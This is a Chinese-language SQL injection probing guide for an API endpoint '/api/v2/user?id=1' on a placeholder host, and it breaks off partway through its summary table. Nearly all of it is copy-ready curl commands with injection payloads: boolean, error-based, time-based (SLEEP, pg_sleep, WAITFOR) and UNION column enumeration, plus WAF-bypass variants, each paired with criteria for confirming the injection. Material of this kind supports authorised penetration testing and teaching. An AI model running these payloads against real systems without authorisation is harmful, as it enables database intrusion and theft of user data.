## SQL 注入探测载荷与判断依据（`/api/v2/user?id=1`）

> 选型：curl + 手工差分（布尔/时间/报错三路），零依赖，可直接复制执行

### 0. 基线采集（先拿正常响应做对照）

```bash
# 正常请求，记录状态码 / 长度 / 响应时间 / body 哈希
curl -s -o /tmp/base.body -w 'code=%{http_code} size=%{size_download} time=%{time_total}\n' \
  'http://TARGET/api/v2/user?id=1'
md5sum /tmp/base.body
```

判断依据：后续每个载荷都与这条基线比对 **状态码 / 响应长度 / 响应时间 / body 差异**，四项里任一项稳定偏离即为可疑。

---

### 1. 布尔盲注探测（数字型）

```bash
# 真条件
curl -s -w '\ncode=%{http_code} size=%{size_download}\n' 'http://TARGET/api/v2/user?id=1 AND 1=1'
# 假条件
curl -s -w '\ncode=%{http_code} size=%{size_download}\n' 'http://TARGET/api/v2/user?id=1 AND 1=2'
```

判断依据：
- `1=1` 与基线一致、`1=2` 返回空/报错/长度明显变化 → **数字型注入成立**
- 两者完全一致 → 可能被过滤、参数非数字型、或走了缓存，进入第 2 步

---

### 2. 布尔盲注探测（字符型 / 引号闭合）

```bash
curl -s -w '\ncode=%{http_code} size=%{size_download}\n' "http://TARGET/api/v2/user?id=1'"
curl -s -w '\ncode=%{http_code} size=%{size_download}\n' "http://TARGET/api/v2/user?id=1' AND '1'='1"
curl -s -w '\ncode=%{http_code} size=%{size_download}\n' "http://TARGET/api/v2/user?id=1' AND '1'='2"
```

判断依据：
- 单引号触发 500 / SQL 报错关键字（`syntax error`、`unclosed quotation`、`SQLSTATE`）→ **报错型注入**
- `'1'='1` 正常、`'1'='2` 异常 → **字符型布尔注入成立**
- 单引号被转义成 `\'` 且无报错 → 有转义处理，转第 3 步试数字型绕过

---

### 3. 报错注入（快速确认 + 拿版本）

```bash
# MySQL
curl -s "http://TARGET/api/v2/user?id=1 AND extractvalue(1,concat(0x7e,version()))"
curl -s "http://TARGET/api/v2/user?id=1 AND updatexml(1,concat(0x7e,user(),0x7e),1)"
# PostgreSQL
curl -s "http://TARGET/api/v2/user?id=1 AND 1=cast((select version()) as int)"
# MSSQL
curl -s "http://TARGET/api/v2/user?id=1 AND 1=convert(int,(select @@version))"
```

判断依据：响应体出现 `XPATH syntax error: '~5.7.xx'` / `invalid input syntax` / `Conversion failed` 且夹带版本串 → **报错注入成立，且已拿到 DB 版本**。

---

### 4. 时间盲注（布尔与报错都被吞时的兜底）

```bash
# MySQL
curl -s -o /dev/null -w 'time=%{time_total}\n' "http://TARGET/api/v2/user?id=1 AND SLEEP(5)"
curl -s -o /dev/null -w 'time=%{time_total}\n' "http://TARGET/api/v2/user?id=1 AND SLEEP(0)"
# PostgreSQL
curl -s -o /dev/null -w 'time=%{time_total}\n' "http://TARGET/api/v2/user?id=1;SELECT pg_sleep(5)--"
# MSSQL
curl -s -o /dev/null -w 'time=%{time_total}\n' "http://TARGET/api/v2/user?id=1;WAITFOR DELAY '0:0:5'--"
```

判断依据：`SLEEP(5)` 稳定 ≥5s、`SLEEP(0)` 回到基线耗时，**重复 3 次都成立**才算（单次抖动不算）。这是最可靠的判据，因为响应内容被统一包装也不影响。

---

### 5. 联合查询探测（确认列数，为后续取数铺路）

```bash
for n in 1 2 3 4 5; do
  echo -n "cols=$n -> "
  curl -s -o /dev/null -w 'code=%{http_code} size=%{size_download}\n' \
    "http://TARGET/api/v2/user?id=1 ORDER BY $n"
done
```

判断依据：`ORDER BY n` 在某个 n 开始报错/长度突变 → 列数 = n-1。随后：

```bash
curl -s "http://TARGET/api/v2/user?id=-1 UNION SELECT 1,2,3,4-- -"
```

响应里出现回显位数字（`2`、`3`）→ **联合注入成立**，回显位即可直接取 `database()`、`user()`、表名。

---

### 6. 过滤/绕过对照（判断是否 WAF 或参数化）

```bash
# 大小写与注释混淆
curl -s "http://TARGET/api/v2/user?id=1 aNd 1=1"
curl -s "http://TARGET/api/v2/user?id=1/**/AND/**/1=1"
# 编码
curl -s "http://TARGET/api/v2/user?id=1%20AND%201=1"
curl -s "http://TARGET/api/v2/user?id=1%2527"
# 参数污染
curl -s "http://TARGET/api/v2/user?id=1&id=1 AND 1=2"
```

判断依据：原样载荷被拦（403/统一错误页），混淆后恢复基线差异 → **存在关键字过滤但可绕**；所有变体都返回同一响应 → 大概率参数化查询或强校验，标 `[推断]` 并停止深入。

---

### 判定汇总表

| 现象 | 结论 | 置信度 |
| --- | --- | --- |
| `1=1` 与 `1=2` 响应稳定不同 | 数字型布尔注入 | 已验证 |
| 单引号触发 SQL 报错关键字 | 报错型注入 | 已验证 |
| `SLEEP(5)` 三次均 ≥5s | 时间盲注 | 已验证 |
| `ORDER BY n` 定位列数 + UNION 回显 | 联合注入 | 已验证 |
| 仅长度微差、无报错、